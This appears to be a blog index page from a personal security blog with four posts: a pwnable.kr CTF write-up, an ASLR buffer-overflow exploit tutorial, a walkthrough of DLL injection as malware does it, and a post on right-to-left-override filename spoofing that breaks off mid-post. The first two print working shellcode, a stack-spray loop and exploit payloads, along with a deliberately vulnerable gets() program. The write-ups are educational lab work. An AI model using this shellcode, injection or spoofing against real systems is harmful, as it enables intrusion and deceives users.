@@ -1,0 +1,887 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="ja"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>Sheep Shellcode</title>
+  <meta name="author" content="Vincent Moscatello">
+
+  
+  <meta name="description" content="tiny_easy was a great example of how you can still put a large amount of complexity into a challenge that’s only 4 instructions. If you haven’t tried &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://quantumvm.github.io//github/2/">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="Sheep Shellcode" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/lib/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  
+  
+  <script type="text/javascript">
+    var _gaq = _gaq || [];
+    _gaq.push(['_setAccount', 'UA-67946241-1']);
+    _gaq.push(['_trackPageview']);
+
+    (function() {
+      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+      ga.src = ('https:' == document.location.protocol ? 'https://' : 'http://') + 'stats.g.doubleclick.net/dc.js';
+      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+    })();
+  </script>
+
+
+</head>
+
+<body >
+  <div id="container">
+    <header role="banner"><hgroup>
+  <h1><a href="/">Sheep Shellcode</a></h1>
+  
+    <h2>The hackery blog of Vincent Moscatello.</h2>
+  
+</hgroup>
+
+</header>
+    <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:quantumvm.github.io//github" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/tutorials">Tutorials</a></li>
+  <li><a href="/resume/MoscatelloResume.pdf">Resume</a></li>
+  <li><a href="/archives">Archives</a></li>
+</ul>
+
+</nav>
+    <div id="main">
+      <div id="content">
+        <div class="blog-index">
+  
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2015/09/02/a-tiny-easy-ctf-challenge/">A Tiny Easy CTF Challenge</a></h1>
+    
+    
+      <div class="post-meta">
+        <p class="meta">
+          <span class="timestamp">- 
+
+
+
+
+
+
+
+
+  
+
+
+
+<time datetime="2015-09-02T11:40:10-04:00" pubdate data-updated="true"></time> -</span>
+          
+        </p>
+      </div>
+    
+  </header>
+
+
+  <div class="entry-content"><p>tiny_easy was a great example of how you can still put a large amount of complexity into a challenge that’s only 4 instructions. If you haven’t tried the challenge on your own make sure you check out at <a href="http://pwnable.kr/play.php">http://pwnable.kr/play.php</a> . This write-up contains spoilers, consider yourself warned!</p>
+
+<p>The challenge starts by prompting you to ssh into a box running Ubuntu. I tried cat-ing /proc/sys/kernel/randomize_va_space and it looks like they left ASLR enabled. Excellent.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='BASH'><span class='line'>ssh tiny_easy@pwnable.kr -p2222 <span class="o">(</span>pw:guest<span class="o">)</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p><img class="center" src="/images/tiny-easy/pwnablekr.png"></p>
+
+<p>Looks like the executable is a pretty standard pwnable. It’s a setuid binary where the objective is to call setuid and then spawn a shell so you can cat the flag.</p>
+
+<p>I decided that it would be easier to work with the executable locally so I scp-ed it onto my own hardware.</p>
+
+<p><img class="center" src="/images/tiny-easy/file.png"></p>
+
+<p>I started the analysis by running file on the executable. This actually yielded two important pieces of information. First, the executable is statically linked. Second, the executable has a corrupted section header size. Both of these will come into play later during exploitation.</p>
+
+<p><img class="center" src="/images/tiny-easy/objdump.png"></p>
+
+<p>This is where analyzing the executable starts to become more difficult. Running objdump on the executable didn’t dump any instructions! I am not entirely sure why this happened. My best guess is that since the executable didn’t contain a section header table, objdump just gave up on doing any disassembly.</p>
+
+<p>So it was time to be creative! I decided that the easiest way to get to the instructions would be to load executable into gdb and place a breakpoint on the executable’s entry point. I was able to get that entry point using readelf, which does a pretty reliable job of parsing through the elf header.</p>
+
+<p><img class="center" src="/images/tiny-easy/readelf.png"></p>
+
+<p>Some other interesting information we get from readelf is the fact that the program header and the elf header compose (32+52) = 84 out of the 90 bytes in the program. This means that there are only 6 bytes worth of executable instructions in the file.</p>
+
+<p><img class="center" src="/images/tiny-easy/break-on-entry.png"></p>
+
+<p>My gdb is slightly more colorful than the one most people are familiar with. Its actually gdb-peda you can check it out here: <a href="https://github.com/longld/peda">https://github.com/longld/peda</a> “Python Exploit Development Assistance for GDB” makes exploitation significantly easier.</p>
+
+<p>tiny_easy doesn’t even bother trying to create a stack frame. Instead it pops argc into eax, pops a char pointer (argv[0]) into edx, dereferences that pointer/stores its contents into edx, and then finally it calls edx. When we type c and tell the program to continue, it does exactly what we expect it to: segfault. Let’s take a look at the registers at the time of the crash.</p>
+
+<p><img class="center" src="/images/tiny-easy/content-of-edx.png"></p>
+
+<p>Once again nothing surprising here. The program crashes at the first 4 ascii characters of argv[0]. After quite a bit of googling it turns out that the built in command exec in bash lets you modify the value of argv when executing.</p>
+
+<p><img class="center" src="/images/tiny-easy/exec.png"></p>
+
+<p>By opening up the core dump in gdb we can see that we got it to crash to 0x42424242 W00t!</p>
+
+<p><img class="center" src="/images/tiny-easy/crash.png"></p>
+
+<p>But we are not quite done yet. Actually we are far from done! Now that we control the value of eip where should we tell it to go?</p>
+
+<p>ASLR makes this tricky and we can’t really use return oriented programing since our 6 byte program doesn’t call any functions. Since the program is statically compiled we don’t even have any dynamic libraries/a GOT we can poke around with.</p>
+
+<p>I decided to depend on an extremely messy technique influenced by some old write-ups I’ve read for IE6. Quite a few IE6 exploits use “heap spraying” to get code execution.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class='BASH'><span class='line'><span class="o">[</span>NOPS * 4096<span class="o">]</span>
+</span><span class='line'><span class="o">[</span> SHELLCODE <span class="o">]</span>
+</span><span class='line'><span class="o">[</span>NOPS * 4096<span class="o">]</span>
+</span><span class='line'><span class="o">[</span> SHELLCODE <span class="o">]</span>
+</span><span class='line'><span class="o">[</span>NOPS * 4096<span class="o">]</span>
+</span><span class='line'><span class="o">[</span> SHELLCODE <span class="o">]</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The idea here is you fill the heap with NOPS followed by shellcode and hope you land somewhere in the middle of one of the sleds so you can slide into your shellcode.</p>
+
+<p>We are going to apply the same technique here but instead of spraying the heap we are going to spray the stack. I decided to use environmental variables to do the spraying.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class='BASH'><span class='line'><span class="p">|</span>-------EXPLOIT-------<span class="p">|</span>
+</span><span class='line'><span class="k">for</span> i in <span class="sb">`</span>seq <span class="m">1</span> 100<span class="sb">`</span><span class="p">;</span>
+</span><span class='line'><span class="k">do</span>
+</span><span class='line'><span class="nb">export </span>A_<span class="nv">$i</span><span class="o">=</span><span class="k">$(</span>python -c <span class="s1">&#39;print &quot;\x90&quot;*4096 + &quot;\x6a\x17\x58\x31\xdb\xcd\x80\x6a\x2e\x58\x53\xcd\x80\x31\xd2\x6a\x0b\x58\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80&quot;&#39;</span><span class="k">)</span><span class="p">;</span>
+</span><span class='line'><span class="k">done</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>It took two tries before I was able to get successful code execution.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class='BASH'><span class='line'><span class="p">|</span>-------FAIL-------<span class="p">|</span>
+</span><span class='line'>tiny_easy@ubuntu:~<span class="nv">$ </span><span class="nb">exec</span> -a <span class="k">$(</span>python -c <span class="s1">&#39;print &quot;\x90\xd5\x9c\xff&quot;&#39;</span><span class="k">)</span> ./tiny_easy <span class="p">&amp;</span>
+</span><span class='line'><span class="o">[</span>1<span class="o">]</span> 12576
+</span><span class='line'>tiny_easy@ubuntu:~<span class="nv">$ </span><span class="nb">fg</span>
+</span><span class='line'>-bash: <span class="nb">fg</span>: job has terminated
+</span><span class='line'><span class="o">[</span>1<span class="o">]</span>+  Segmentation fault      <span class="nb">exec</span> -a <span class="k">$(</span>python -c <span class="s1">&#39;print &quot;\x90\xd5\x9c\xff&quot;&#39;</span><span class="k">)</span> ./tiny_easy
+</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class='BASH'><span class='line'><span class="p">|</span>-------SUCCESS-------<span class="p">|</span>
+</span><span class='line'>tiny_easy@ubuntu:~<span class="nv">$ </span><span class="nb">exec</span> -a <span class="k">$(</span>python -c <span class="s1">&#39;print &quot;\x90\xd5\x9c\xff&quot;&#39;</span><span class="k">)</span> ./tiny_easy <span class="p">&amp;</span>
+</span><span class='line'><span class="o">[</span>1<span class="o">]</span> 12579
+</span><span class='line'>tiny_easy@ubuntu:~<span class="nv">$ </span><span class="nb">fg</span>
+</span><span class='line'><span class="nb">exec</span> -a <span class="k">$(</span>python -c <span class="s1">&#39;print &quot;\x90\xd5\x9c\xff&quot;&#39;</span><span class="k">)</span> ./tiny_easy
+</span><span class='line'><span class="nv">$ </span>whoami
+</span><span class='line'>tiny_easy
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Success! Time to claim the spoils of victory</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='BASH'><span class='line'><span class="nv">$ </span>cat flag
+</span><span class='line'>What a tiny task :<span class="o">)</span> good job!
+</span></code></pre></td></tr></table></div></figure>
+
+</div>
+  
+  
+
+
+      <footer>
+      
+      - <a href="/blog/2015/09/02/a-tiny-easy-ctf-challenge/">A Tiny Easy CTF Challenge</a>
+      <time datetime="2015-09-02T11:40:10-04:00" pubdate><span class='month'>Sep</span> <span class='day'>02</span> <span class='year'>2015</span></time>
+      
+      <span class="categories">posted in <a class='category' href='/blog/categories/ctf/'>ctf</a></span>
+      
+      </footer>
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2015/03/24/writing-buffer-overflow-exploits-with-aslr/">Writing Buffer Overflow Exploits With ASLR</a></h1>
+    
+    
+      <div class="post-meta">
+        <p class="meta">
+          <span class="timestamp">- 
+
+
+
+
+
+
+
+
+  
+
+
+
+<time datetime="2015-03-24T18:33:43-04:00" pubdate data-updated="true"></time> -</span>
+          
+        </p>
+      </div>
+    
+  </header>
+
+
+  <div class="entry-content"><p>Today I decided to refresh my memory of buffer overflows by writing a short vulnerable program and then an exploit for it. To make things more interesting, I decided to challenge myself to write an exploit for the program that would work with ASLR enabled.</p>
+
+<p><img class="center" src="/images/buffer-overflow-aslr/randomization-proc-sys-kernel.png"></p>
+
+<p>The vulnerable program I wrote is found below. It uses the deprecated gets function which does not limit the amount of data being copied into its buffer. To avoid having to deal with DEP I decided to compile the program with the flag “-z execstack”.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class='C'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">void</span> <span class="nf">vulnerable</span><span class="p">(){</span>
+</span><span class='line'>  <span class="kt">char</span> <span class="n">overflowed</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
+</span><span class='line'>  <span class="n">gets</span><span class="p">(</span><span class="n">overflowed</span><span class="p">);</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
+</span><span class='line'>  <span class="n">vulnerable</span><span class="p">();</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Time to dive into exploitation. The first step was to calculate how many bytes were needed to overflow the buffer on the stack. I decided to streamline the process and use the script pattern_create.rb which is found in the metasploit framework.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class='BASH'><span class='line'>//Find generate pattern
+</span><span class='line'>root@kali:~/Documents/buffer_overflow/dat# locate pattern_create.rb
+</span><span class='line'>/usr/share/metasploit-framework/tools/pattern_create.rb
+</span><span class='line'>//Generate pattern
+</span><span class='line'>root@kali:~/Documents/buffer_overflow/dat# /usr/share/metasploit-framework/tools/pattern_create.rb <span class="m">64</span> &gt; pattern
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Next step was to feed the pattern to the vulnerable program. It’s important to mention that before I did this I decided to enable core dumps to get an accurate representation of the program’s memory after it crashed.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='BASH'><span class='line'>//Enable core dumps
+</span><span class='line'>root@kali:~/Documents/buffer_overflow# <span class="nb">ulimit</span> -c unlimited
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p><img class="center" src="/images/buffer-overflow-aslr/firstsegfault.png"></p>
+
+<p>To get the offset to the saved instructional pointer I just fed the address to pattern-offset.rb</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class='BASH'><span class='line'>
+</span><span class='line'>//pattern offset
+</span><span class='line'>root@kali:~/Documents/buffer_overflow# locate pattern_offset.rb
+</span><span class='line'>/usr/share/metasploit-framework/tools/pattern_offset.rb
+</span><span class='line'>root@kali:~/Documents/buffer_overflow# /usr/share/metasploit-framework/tools/pattern_offset.rb 62413961
+</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Exact match at offset 28
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>To make sure this worked I wrote a one lined ruby command to make sure the program crashed to the address 0x42424242 (the ascii letter B) and then analyzed the core dump.</p>
+
+<p><img class="center" src="/images/buffer-overflow-aslr/second-segfault.png"></p>
+
+<p>One technique for making the buffer overflow exploit position independent is to jump to a register rather than a hardcoded address on the stack. A good register for this is esp. This works because although the contents of the register esp will change, the opcode to jump to esp will not. This can be shown by running the program twice and printing the contents of the registers using gdb.</p>
+
+<p><img class="center" src="/images/buffer-overflow-aslr/inforeg1.png"></p>
+
+<p><img class="center" src="/images/buffer-overflow-aslr/inforeg2.png"></p>
+
+<p>The next picture below just illustrates how esp in the second picture above points just after the value used for overflowing the stack. Perfect spot to store shellcode!</p>
+
+<p><img class="center" src="/images/buffer-overflow-aslr/looking-at-esp.png"></p>
+
+<p>The next step is to find some location in the text segment that has the instruction jmp esp.  For most programs written in linux the position of the text segment does not change each time the program is executed even with ASLR enabled. The start address of the text segment is actually a hard coded value found in the elf header file. Great! A tool that can help us look for the opcodes is msfelfscan.</p>
+
+<p>After running the command I felt a little stumped. The program did not use the instruction jmp esp anywhere in the text segment! My solution to this problem was to try and find a register with a different address that could be manipulated. Looking back at the register values at the time of crash eax seemed to fit the bill perfectly! The value of eax at the time of the crash stored the starting address of the data being copied onto the stack from gets. I ran msfelfscan a second time but this time looking for calls or jumps to eax. Found it.</p>
+
+<p><img class="center" src="/images/buffer-overflow-aslr/calleax.png"></p>
+
+<p>My solution for exploiting the program became the following:</p>
+
+<ol>
+<li>Generate the opcode for jump esp</li>
+<li>Overwrite the value on the stack pointed to by eax with that opcode</li>
+<li>Overwrite eip with the address of the call eax instruction.</li>
+</ol>
+
+
+<p>Since I don’t have the entire x86 instruction set memorized cough cough. I decided to write a short assembly program using nasm to get the opcode for jump esp. First I compiled the file with nasm using the flag –f elf. Then I linked the program using ld and ran the a.out file it generated using objdump.</p>
+
+<p><img class="center" src="/images/buffer-overflow-aslr/objdump.png"></p>
+
+<p>The full exploit, written in ruby, is found below. To test if it worked I used shellcode that should print a simple “hello world!” message.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="c1">#jump to eax</span>
+</span><span class='line'><span class="c1">#eax calls esp</span>
+</span><span class='line'><span class="c1">#esp points to shellcode</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\xeb\x13\x59\x31\xc0\xb0\x04\x31\xdb\x43\x31\xd2</span><span class="s2">&quot;</span><span class="o">+</span>
+</span><span class='line'>          <span class="s2">&quot;</span><span class="se">\xb2\x0f\xcd\x80\xb0\x01\x4b\xcd\x80\xe8\xe8\xff</span><span class="s2">&quot;</span><span class="o">+</span>
+</span><span class='line'>          <span class="s2">&quot;</span><span class="se">\xff\xff\x48\x65\x6c\x6c\x6f\x2c\x20\x77\x6f\x72</span><span class="s2">&quot;</span><span class="o">+</span>
+</span><span class='line'>          <span class="s2">&quot;</span><span class="se">\x6c\x64\x21\x0a\x0d</span><span class="s2">&quot;</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'><span class="nb">print</span> <span class="s2">&quot;</span><span class="se">\x90\x90\xd4\xff</span><span class="s2">&quot;</span> <span class="o">+</span> <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">24</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\x77\x83\x04\x08</span><span class="s2">&quot;</span> <span class="o">+</span> <span class="n">payload</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>And finally, pwnage.</p>
+
+<p><img class="center" src="/images/buffer-overflow-aslr/pwnage.png"></p>
+</div>
+  
+  
+
+
+      <footer>
+      
+      - <a href="/blog/2015/03/24/writing-buffer-overflow-exploits-with-aslr/">Writing Buffer Overflow Exploits With ASLR</a>
+      <time datetime="2015-03-24T18:33:43-04:00" pubdate><span class='month'>Mar</span> <span class='day'>24</span> <span class='year'>2015</span></time>
+      
+      <span class="categories">posted in <a class='category' href='/blog/categories/tutorials/'>tutorials</a></span>
+      
+      </footer>
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2015/02/01/dll-injection-on-windows-xp/">Dll Injection on Windows XP</a></h1>
+    
+    
+      <div class="post-meta">
+        <p class="meta">
+          <span class="timestamp">- 
+
+
+
+
+
+
+
+
+  
+
+
+
+<time datetime="2015-02-01T19:29:34-05:00" pubdate data-updated="true"></time> -</span>
+          
+        </p>
+      </div>
+    
+  </header>
+
+
+  <div class="entry-content"><p>Although sometimes it obvious when a computer’s integrity has been compromised by malware (addware, fakeAV, etc), other times it’s much less obvious. Some malware samples, like those designed to exfiltrate creditcard information/ user logins, can have their largest impact when the user doesn’t know they’ve been infected.</p>
+
+<p>To avoid detection malware will often rename itself to something harmless. One of the most recent malware sample I’ve analyzed, a sample from the Alina family of viruses, tried to rename its self winfax12.exe to try and avoid detection on point of sale machines.</p>
+
+<p>A more sophisticated method of persistence that doesn’t rely on social engineering is to have the malware sample inject itself into the memory of another actively running process. The most common way to do this on WindowsXP is through a process called DLL injection.
+Although there are variations on the process, malware will often take the following route to inject itself into a running process on WindowsXP</p>
+
+<ol>
+<li>Obtain a handle to the running process</li>
+<li>Allocate enough memory for the name of the dll to inject in the running process.</li>
+<li>Write the name of the dll to inject into the running process.</li>
+<li>Use Kernel32.dll to get hold of LoadLibraryA in the running process</li>
+<li>Create a new thread in the running process using CreateRemoteThread. The starting address of this thread is at LoadLibraryA and the name of the dll that was written into this process is passed as a parameter to LoadLibraryA.</li>
+</ol>
+
+
+<p>By reverse engineering a malware sample in IDA I’ve reconstructed similar program in C seen running in the video below. In the video, the game solitaire named sol.exe is injected with mydll.dll which triggers a windows message box.</p>
+
+<center>  
+<iframe width="560" height="315" src="https://www.youtube.com/embed/JTDlu9Lt-cw" frameborder="0" allowfullscreen></iframe>
+</center>
+
+
+<p>For those new to translating programs in IDA from assembly to C, one of the hardest parts can be getting used to the fact the arguments are pushed onto the stack in reverse order.</p>
+
+<p><img class="center" src="/images/windows-dll-injection-resources/VirtualAlloc.png"></p>
+
+<p>In the picture above the function VirtualAllocEx is used to allocate enough memory into the running process so later the name of the dll to inject has a place to be written to. According to Microsoft’s documentation the prototype for VirtualAllocEX looks like the following:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">LPVOID</span> <span class="n">WINAPI</span> <span class="nf">VirtualAllocEx</span><span class="p">(</span>
+</span><span class='line'>  <span class="n">_In_</span>      <span class="n">HANDLE</span> <span class="n">hProcess</span><span class="p">,</span>
+</span><span class='line'>  <span class="n">_In_opt_</span>  <span class="n">LPVOID</span> <span class="n">lpAddress</span><span class="p">,</span>
+</span><span class='line'>  <span class="n">_In_</span>      <span class="n">SIZE_T</span> <span class="n">dwSize</span><span class="p">,</span>
+</span><span class='line'>  <span class="n">_In_</span>      <span class="n">DWORD</span> <span class="n">flAllocationType</span><span class="p">,</span>
+</span><span class='line'>  <span class="n">_In_</span>      <span class="n">DWORD</span> <span class="n">flProtect</span>
+</span><span class='line'><span class="p">);</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Before actually reading the documentation this almost looks more cryptic than the assembly. It also doesn’t help that by default instead of displaying symbolic constants like PAGE_READWRITE and MEM_COMMIT as string values in the previous picture IDA will just list these as integers. By right clicking the integer values you can select what symbolic constant to replace them with in IDA.</p>
+
+<p>Actually reading Microsoft’s documentation, the rough equivalent of the excellent linux man pages, it  becomes clear that hProcess is a handle to the process to inject, lpAddress is a preferred starting location for the allocation, dwSize is the number of bytes to allocate, and flAllocationType/flProtect are one of the symbolic constants shown earlier.</p>
+
+<p>It would be tedious to explain every function but the rest of the program that actually does the injecting can be found on git here: <a href="https://github.com/quantumvm/InjectDll/blob/master/Source.c">https://github.com/quantumvm/InjectDll/blob/master/Source.c</a>
+The second half of this puzzle is how what to actually put into the dll that will be injected into the running process. Since Visual studio seems to like c++ a lot, it’s not fantastic for just c development, I wrote the actual dll in c++ instead of c.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">MessageBoxA</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="s">&quot;Hello world!&quot;</span><span class="p">,</span> <span class="s">&quot;hello world&quot;</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span><span class='line'><span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>When a dll is compiled its entry point is defined by the function DllMain. Visual studio provides most of the code you need for the dll already (The empty switch isn’t even necessary!) its very easy to append the functionally you want at the end of the DllMain function. The full dll I wrote for this project can be found here: <a href="https://github.com/quantumvm/InjectDll/blob/master/sample_dll/dllmain.cpp">https://github.com/quantumvm/InjectDll/blob/master/sample_dll/dllmain.cpp</a></p>
+
+<p>Before wrapping things up here are a few caveats:
+Although using the CreateRemoteThread method works fantastic in windows XP the method will fail in windows vista onward. The alternative is to use undocumented functions like NTCreateRemoteThread but this disadvantage is that the malware can only inject the dll into windowed programs using this function.</p>
+
+<p>When compiling the c program for Windows XP on VisualStudio 2012 onward you encounter a few small problems with backward compatibility specifically for the function OpenProcess. Between XP and vista the size of the flag PROCESS_ALL_ACCESS is actually changed so it’s necessary to tell the preprocessor that we want to support windows XP by including the following flag at the top of the program:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#define _WIN32_WINNT _WIN32_WINNT_WINXP</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+
+</div>
+  
+  
+
+
+      <footer>
+      
+      - <a href="/blog/2015/02/01/dll-injection-on-windows-xp/">Dll Injection on Windows XP</a>
+      <time datetime="2015-02-01T19:29:34-05:00" pubdate><span class='month'>Feb</span> <span class='day'>01</span> <span class='year'>2015</span></time>
+      
+      <span class="categories">posted in <a class='category' href='/blog/categories/malware/'>malware</a></span>
+      
+      </footer>
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2015/01/15/spoofing-file-extensions/">Spoofing File Extensions</a></h1>
+    
+    
+      <div class="post-meta">
+        <p class="meta">
+          <span class="timestamp">- 
+
+
+
+
+
+
+
+
+  
+
+
+
+<time datetime="2015-01-15T13:06:02-05:00" pubdate data-updated="true"></time> -</span>
+          
+        </p>
+      </div>
+    
+  </header>
+
+
+  <div class="entry-content"><p>After running a few malware samples in a virtual machine, it becomes obvious that malware developers thrive on social engineering. Why bother waiting for a zero day when you can just attack human error? Here are a few social engineering attempts I’ve seen so far:</p>
+
+<p><img class="center" src="/images/spoofing-file-ext-resources/fakefiletypes.png"></p>
+
+<p>I would say the most common “spoofed” file type is probably a pdf. So it’s a good idea to think twice before visiting a dodgy site to save money on textbooks.</p>
+
+<p>More advanced users know that to run an exe in Windows its necessary to use the file extension “.exe”. If a malware developer wanted to distribute a file that was still executable but looked like a pdf it would still have to be called something like “myevilfile.pdf.exe&#8221;. The alternative of course is to use a pdf viewer exploit but not every system will be running a vulnerable pdf viewer. File extensions are hidden by default on windows so leaving the file name as &ldquo;.exe&rdquo; can still be effective.</p>
+
+<p>But what if a user DOES have file extensions enabled? An “.exe” extension for a pdf may immediately throw some red flags. A malware developer could use some clever Unicode characters to flip the file extension name. This trick was originally described by Lyle Frank from the Avast blog: <a href="https://blog.avast.com/2011/09/07/unpacking-the-unitrix-malware/">https://blog.avast.com/2011/09/07/unpacking-the-unitrix-malware/</a></p>
+
+<p>The magic happens with the Unicode character U+202E called “Right-To-Left-Override” what this character does is flip all characters to the right of it over a central axis. For example a file called “eci.exe” that has the Unicode character U+202E inserted in front of it will appear as “exe.ice” the file name is flipped over the dot.</p>
+
+<p>The trick is pretty simple for a malware developer to deploy. Just open up All Programs-Accessories-System tools-Character Map then copy the character and paste it into the file name after right clicking.</p>
+
+<p><img class="center" src="/images/spoofing-file-ext-resources/Righttoleftoverride.png"></p>
+
+<p>In the picture bellow the file was originally named “TextFilfdp.exe” After inserting the Unicode character after the letter “L” the file name appears as “TextFilexe.pdf”</p>
+
